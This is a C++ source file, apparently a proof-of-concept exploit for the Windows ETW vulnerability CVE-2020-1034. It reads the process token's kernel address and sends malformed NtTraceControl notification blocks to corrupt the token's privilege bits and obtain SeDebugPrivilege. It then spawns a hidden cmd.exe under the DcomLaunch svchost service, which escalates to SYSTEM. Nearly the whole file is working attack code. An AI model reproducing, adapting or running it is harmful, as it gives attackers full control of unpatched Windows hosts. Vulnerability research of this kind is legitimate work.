#include "pch.h"
#include "utils.h"


static constexpr auto szDcomLaunch = L"DcomLaunch";
static constexpr auto szCmd = LR"(c:\windows\system32\cmd.exe)";


DEFINE_GUID(EXPLOIT_GUID, 0x4838fe4f, 0xf71c, 0x4e51, 
	0x9e, 0xcc, 0x84, 0x30, 0xa7, 0xac, 0x4c, 0x6c);


ULONG EtwNotificationCallback(ETW_NOTIFICATION_HEADER* /* NotificationHeader */, PVOID /* Context */)
{
	return 1;
}


int main()
{
	try
	{
		//
		// Obtain process token and its address
		// 

		ATL::CAccessToken ProcessToken;
		if (!ProcessToken.GetProcessToken(TOKEN_ALL_ACCESS)) {
			//NATIVE_THROW_LAST();
		}

		const auto TokenAddress = cve_2020_1034::GetTokenAddress(ProcessToken.GetHandle());
		//NATIVE_CHECK_POINTER_LAST(TokenAddress);

		wprintf(L"Token address found: 0x%p\n", TokenAddress);

		//
		// Privileges addresses
		// 

		const auto PresentPrivilegesAddress = (PVOID)((ULONG64)TokenAddress +
			offsetof(TOKEN, Privileges.Present) + 2);
		const auto EnabledPrivilegesAddress = (PVOID)((ULONG64)TokenAddress +
			offsetof(TOKEN, Privileges.Enabled) + 2);

		wprintf(L"Editing addresses: 0x%p, 0x%p\n", PresentPrivilegesAddress, EnabledPrivilegesAddress);

		//
		// Create 16 providers
		// 

		for (auto i = 0; i < 16; ++i)
		{
			REGHANDLE RegHandle;
			ULONG     Result = cve_2020_1034::EtwNotificationRegister(&EXPLOIT_GUID,
				EtwNotificationTypeCredentialUI, EtwNotificationCallback, nullptr, &RegHandle);

			//NATIVE_CHECK_ERROR(Result);
		}

		//
		// Make SeDebugPrivilege present in token
		// 

		ETWP_NOTIFICATION_HEADER DataBlock = {};

		DataBlock.NotificationType = EtwNotificationTypeCredentialUI;
		DataBlock.ReplyRequested   = 2;  // Something different from FALSE or TRUE
		DataBlock.NotificationSize = sizeof(DataBlock);
		DataBlock.ReplyObject      = (LPVOID)((ULONG64)(PresentPrivilegesAddress) + offsetof(OBJECT_HEADER, Body));
		DataBlock.DestinationGuid  = EXPLOIT_GUID;

		ETW_NOTIFICATION_HEADER OutputBuffer = {};
		DWORD ReturnLength = 0;

		cve_2020_1034::NtTraceControl(EtwSendDataBlock,
			&DataBlock, sizeof(DataBlock), &OutputBuffer, sizeof(OutputBuffer), &ReturnLength);

		//
		// Enable privilege
		// 

		DataBlock.NotificationType = EtwNotificationTypeCredentialUI;
		DataBlock.ReplyRequested   = 2;
		DataBlock.NotificationSize = sizeof(DataBlock);
		DataBlock.ReplyObject      = (LPVOID)((ULONG64)(EnabledPrivilegesAddress) + offsetof(OBJECT_HEADER, Body));
		DataBlock.DestinationGuid  = EXPLOIT_GUID;

		cve_2020_1034::NtTraceControl(EtwSendDataBlock,
			&DataBlock, sizeof(DataBlock), &OutputBuffer, sizeof(OutputBuffer), &ReturnLength);

		wprintf(L"Privileges edited\n");

		//
		// Send two correct requests. Just to make everything fine
		// 

		for (auto i = 0; i < 2; ++i)
		{
			DataBlock.NotificationType = EtwNotificationTypeCredentialUI;
			DataBlock.ReplyRequested   = TRUE;
			DataBlock.NotificationSize = sizeof(DataBlock);
			DataBlock.DestinationGuid  = EXPLOIT_GUID;

			NTSTATUS Status = cve_2020_1034::NtTraceControl(EtwSendDataBlock,
				&DataBlock, sizeof(DataBlock), &OutputBuffer, sizeof(OutputBuffer), &ReturnLength);
			//NATIVE_CHECK_ERROR(Status);
		}

		wprintf(L"Exploit successfully elevated to receive debug privileges\n");

		//
		// Open DcomLaunch (svchost.exe)
		// 

		ATL::CHandle hDcomLaunch{ cve_2020_1034::GetServiceHandle(szDcomLaunch) };

		//
		// Create process attributes for a new process
		// 

		SIZE_T ListSize = 0;
		::InitializeProcThreadAttributeList(nullptr, 1, 0, &ListSize);

		std::vector<BYTE> ProcListBuffer(ListSize, 0);
		const auto ProcList = reinterpret_cast<PPROC_THREAD_ATTRIBUTE_LIST>(ProcListBuffer.data());

		if (!::InitializeProcThreadAttributeList(ProcList, 1, 0, &ListSize)) {
			//NATIVE_THROW_LAST();
		}

		//
		// svchost.exe will be a parent
		// 

		DWORD_PTR dwAttribute = PROC_THREAD_ATTRIBUTE_PARENT_PROCESS;
		BOOL bResult = ::UpdateProcThreadAttribute(ProcList, 0, dwAttribute, &hDcomLaunch.m_h, sizeof(hDcomLaunch.m_h), nullptr, nullptr);
		
		if (!bResult) {
			//NATIVE_THROW_LAST();
		}

		//
		// Now create new process
		// 

		STARTUPINFOEX StartupInfo = {};
		PROCESS_INFORMATION ProcessInfo = {};

		StartupInfo.StartupInfo.cb          = sizeof(StartupInfo);
		StartupInfo.StartupInfo.wShowWindow = SW_HIDE;
		StartupInfo.StartupInfo.dwFlags     = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
		StartupInfo.lpAttributeList         = ProcList;

		DWORD dwCreationFlags = CREATE_NEW_CONSOLE | CREATE_NO_WINDOW | EXTENDED_STARTUPINFO_PRESENT;
		bResult = ::CreateProcess(szCmd, nullptr, nullptr, nullptr, TRUE, dwCreationFlags, nullptr, nullptr, &StartupInfo.StartupInfo, &ProcessInfo);
		//bResult = ::CreateProcess(szCmd, nullptr, nullptr, nullptr, TRUE, 0, nullptr, nullptr, &StartupInfo.StartupInfo, &ProcessInfo);

		if (!bResult) {
			//NATIVE_THROW_LAST();
		}

		wprintf(L"Created process with PID = %u\n", ProcessInfo.dwProcessId);

		//
		// Cleanup...
		// 

		::CloseHandle(ProcessInfo.hThread);
		::CloseHandle(ProcessInfo.hProcess);

		//
		// Well... Actually it falls into BSOD, 
		// so let's wait for Enter here
		// 

		_getch();
	}
	catch(const std::exception& error)
	{
		wprintf(L"%hs\n", error.what());
		return -1;
	}
}
